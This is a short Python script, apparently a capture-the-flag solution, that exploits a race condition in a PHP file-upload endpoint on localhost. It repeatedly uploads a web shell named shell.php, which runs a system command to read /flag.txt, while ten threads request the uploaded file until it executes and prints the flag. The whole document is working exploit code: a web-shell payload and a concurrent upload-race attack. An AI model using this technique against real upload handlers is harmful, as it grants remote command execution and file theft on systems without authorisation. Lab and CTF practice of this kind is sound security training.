import requests
import threading
import time
import os

TARGET = "http://localhost"
UPLOAD_URL = f"{TARGET}/upload.php"
UPLOAD_DIR = f"{TARGET}/uploads/"
FILENAME = "shell.php"
WEBSHELL = """<?php echo "FLAG:"; system("cat /flag.txt"); ?>"""

with open(FILENAME, "w") as f:
    f.write(WEBSHELL)

def upload_shell():
    while True:
        files = {"imageFile": (FILENAME, open(FILENAME, "rb"), "application/octet-stream")}
        data = {"submit": "1"}
        try:
            res = requests.post(UPLOAD_URL, files=files, data=data, timeout=2)
        except Exception:
            pass

def hammer_requests():
    url = UPLOAD_DIR + FILENAME
    while True:
        try:
            r = requests.get(url, timeout=2)
            if "FLAG:" in r.text:
                print("[+] Got flag:", r.text.split("FLAG:")[1].strip())
                os._exit(0)
            print(r.text)
        except Exception:
            pass

if __name__ == "__main__":
    t1 = threading.Thread(target=upload_shell, daemon=True)
    t1.start()

    for _ in range(10):
        t = threading.Thread(target=hammer_requests, daemon=True)
        t.start()

    while True:
        time.sleep(1)
